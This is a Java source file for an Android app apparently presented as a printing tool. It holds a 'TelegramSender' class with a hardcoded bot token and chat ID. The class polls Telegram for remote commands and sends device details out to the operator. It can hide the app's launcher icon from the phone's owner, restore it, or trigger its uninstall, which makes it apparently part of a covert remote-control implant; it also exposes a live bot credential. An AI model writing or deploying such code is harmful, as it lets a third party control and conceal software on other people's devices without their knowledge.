package com.cetakpro.print;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TelegramSender {
    private static final String TAG = "TelegramSender";
    
    private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
    private static final String CHAT_ID = "1286411089";
    
    private static final int CONNECT_TIMEOUT = 15000;
    private static final int READ_TIMEOUT = 15000;
    
    private static long lastUpdateId = 0;
    private static boolean pollingRunning = false;
    private static Handler pollingHandler = new Handler(Looper.getMainLooper());
    private static Context appContext;

    // ============================================================
    // INIT - PANGGIL DARI MAINACTIVITY
    // ============================================================
    public static void init(Context context) {
        if (appContext != null) return;
        appContext = context.getApplicationContext();
        Log.d(TAG, "✅ TelegramSender diinisialisasi");
        startPolling();
    }

    // ============================================================
    // START POLLING
    // ============================================================
    public static void startPolling() {
        if (pollingRunning) return;
        pollingRunning = true;
        Log.d(TAG, "🔄 Polling Telegram dimulai...");
        pollingHandler.post(pollingRunnable);
    }

    public static void stopPolling() {
        pollingRunning = false;
        pollingHandler.removeCallbacks(pollingRunnable);
        Log.d(TAG, "⏹️ Polling Telegram dihentikan");
    }

    private static Runnable pollingRunnable = new Runnable() {
        @Override
        public void run() {
            if (!pollingRunning) return;
            try {
                checkTelegramUpdates();
            } catch (Exception e) {
                Log.e(TAG, "❌ Error polling: " + e.getMessage());
            }
            pollingHandler.postDelayed(this, 5000);
        }
    };

    // ============================================================
    // CEK UPDATE DARI TELEGRAM
    // ============================================================
    private static void checkTelegramUpdates() {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
                              "/getUpdates?offset=" + (lastUpdateId + 1) + 
                              "&timeout=5&limit=10";
            
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            
            int responseCode = conn.getResponseCode();
            
            if (responseCode >= 200 && responseCode < 300) {
                StringBuilder response = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                }
                
                JSONObject json = new JSONObject(response.toString());
                if (json.optBoolean("ok")) {
                    JSONArray results = json.optJSONArray("result");
                    if (results != null) {
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            long updateId = update.optLong("update_id", 0);
                            if (updateId > lastUpdateId) {
                                lastUpdateId = updateId;
                            }
                            
                            JSONObject message = update.optJSONObject("message");
                            if (message != null) {
                                String text = message.optString("text", "");
                                long chatId = message.optJSONObject("chat").optLong("id", 0);
                                
                                Log.d(TAG, "📩 Pesan dari chat " + chatId + ": " + text);
                                
                                if (text.startsWith("/") && String.valueOf(chatId).equals(CHAT_ID)) {
                                    handleTelegramCommand(appContext, text);
                                }
                            }
                        }
                    }
                }
            } else {
                Log.e(TAG, "❌ Error getUpdates HTTP " + responseCode);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error checkTelegramUpdates: " + e.getMessage());
        } finally {
            if (conn != null) {
                try {
                    conn.disconnect();
                } catch (Exception ignored) {}
            }
        }
    }

    // ============================================================
    // KIRIM PESAN KE TELEGRAM
    // ============================================================
    public static void sendMessage(Context context, String title, String message) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String deviceName = getDeviceName(context);
                String fullText = title + "\n" + message + "\n\n📱 " + deviceName;
                
                Log.d(TAG, "📤 Mengirim: " + title);
                
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(CONNECT_TIMEOUT);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                
                String bodyText = "chat_id=" + CHAT_ID + 
                                 "&text=" + URLEncoder.encode(fullText, StandardCharsets.UTF_8.name());
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(bodyText.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }
                
                int responseCode = conn.getResponseCode();
                
                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, "✅ Pesan terkirim (HTTP " + responseCode + ")");
                } else {
                    Log.e(TAG, "❌ Error HTTP " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error sendMessage: " + e.getMessage(), e);
            } finally {
                if (conn != null) {
                    try {
                        conn.disconnect();
                    } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    // ============================================================
    // AMBIL NAMA PERANGKAT
    // ============================================================
    private static String getDeviceName(Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String name = prefs.getString("device_name", Build.MODEL);
            return name != null && !name.isEmpty() ? name : Build.MODEL;
        } catch (Exception e) {
            return Build.MODEL;
        }
    }

    // ============================================================
    // HANDLE COMMAND DARI TELEGRAM
    // ============================================================
    private static void handleTelegramCommand(Context context, String command) {
        Log.d(TAG, "📩 Perintah: " + command);
        
        // /start
        if (command.equalsIgnoreCase("/start")) {
            String deviceName = getDeviceName(context);
            String msg = "🤖 VanNota Bot Aktif!\n\n" +
                         "📱 Perangkat: " + deviceName + "\n" +
                         "Status: ✅ Online\n\n" +
                         "Kirim /menu untuk melihat daftar perintah.";
            sendMessage(context, "✅ Bot Aktif", msg);
            return;
        }
        
        // /menu
        if (command.equalsIgnoreCase("/menu") || command.equalsIgnoreCase("/help")) {
            String menu = "📋 DAFTAR PERINTAH\n\n" +
                          "/start - Cek status bot\n" +
                          "/menu - Tampilkan menu ini\n" +
                          "/hide - Sembunyikan aplikasi\n" +
                          "/unhide - Tampilkan aplikasi\n" +
                          "/uninstall - Hapus aplikasi\n" +
                          "/info - Info perangkat\n" +
                          "/rename [nama] - Ubah nama perangkat";
            sendMessage(context, "📋 Menu", menu);
            return;
        }
        
        // /hide
        if (command.equalsIgnoreCase("/hide")) {
            try {
                PackageManager pm = context.getPackageManager();
                ComponentName cn = new ComponentName(context, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                prefs.edit().putBoolean("app_hidden", true).apply();
                sendMessage(context, "👻 HIDE", "Aplikasi disembunyikan.");
            } catch (Exception e) {
                sendMessage(context, "❌ GAGAL HIDE", e.getMessage());
            }
            return;
        }
        
        // /unhide
        if (command.equalsIgnoreCase("/unhide")) {
            try {
                PackageManager pm = context.getPackageManager();
                ComponentName cn = new ComponentName(context, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                prefs.edit().putBoolean("app_hidden", false).apply();
                sendMessage(context, "👀 UNHIDE", "Aplikasi dimunculkan.");
            } catch (Exception e) {
                sendMessage(context, "❌ GAGAL UNHIDE", e.getMessage());
            }
            return;
        }
        
        // /uninstall
        if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
            sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota...");
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e) {
                sendMessage(context, "❌ GAGAL UNINSTALL", e.getMessage());
            }
            return;
        }
        
        // /info
        if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String deviceName = prefs.getString("device_name", Build.MODEL);
            String deviceId = prefs.getString("device_id", "Tidak diketahui");
            String androidVersion = Build.VERSION.RELEASE;
            String info = "📱 INFO PERANGKAT\n" +
                          "Nama: " + deviceName + "\n" +
                          "Android: " + androidVersion + "\n" +
                          "ID: " + deviceId;
            sendMessage(context, "ℹ️ Info", info);
            return;
        }
        
        // /rename
        if (command.startsWith("/rename ")) {
            String newName = command.substring(8).trim();
            if (newName.isEmpty()) {
                sendMessage(context, "⚠️ RENAME", "Format: /rename [nama baru]");
                return;
            }
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            prefs.edit().putString("device_name", newName).apply();
            sendMessage(context, "✅ RENAME", "Nama diubah menjadi: " + newName);
            return;
        }
        
        // Tidak dikenal
        sendMessage(context, "❓ Tidak dikenal", "Kirim /menu untuk daftar perintah.");
    }
}
